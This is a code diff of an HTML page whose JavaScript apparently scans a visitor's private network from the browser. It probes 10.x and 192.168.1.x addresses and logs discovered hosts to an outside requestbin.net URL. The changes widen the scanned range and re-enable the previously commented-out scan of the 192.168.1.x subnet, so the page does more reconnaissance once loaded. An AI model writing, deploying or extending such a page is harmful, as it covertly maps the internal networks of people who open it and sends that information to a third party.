@@ -6,7 +6,7 @@
   </head>
   <body>   
     <script>
-    var LOG_URL = "http://requestbin.net/r/epzl5wtd";
+    var LOG_URL = "https://requestbin.net/r/epzl5wtd";
     var discoveredHosts = [];
     var timeout = 1000; //1 sec
 
@@ -44,7 +44,7 @@
           }
         }
       }
-      xhr.open("GET", "http://" + host, true);
+      xhr.open("GET", "https://" + host, true);
       xhr.send();
     }
 
@@ -81,7 +81,7 @@
       if (i == 0)
       {
           ip = "10.";
-          while (bit2 <= 10)
+          while (bit2 <= 50)
           {
             while (bit3 <= 1)
             {
@@ -109,7 +109,7 @@
             {
               bit4++;
               ip = "192.168.1"  + "." + bit4;
-              //doRequest(ip);
+              doRequest(ip);
             }
             bit4 = 0;
             bit3++;
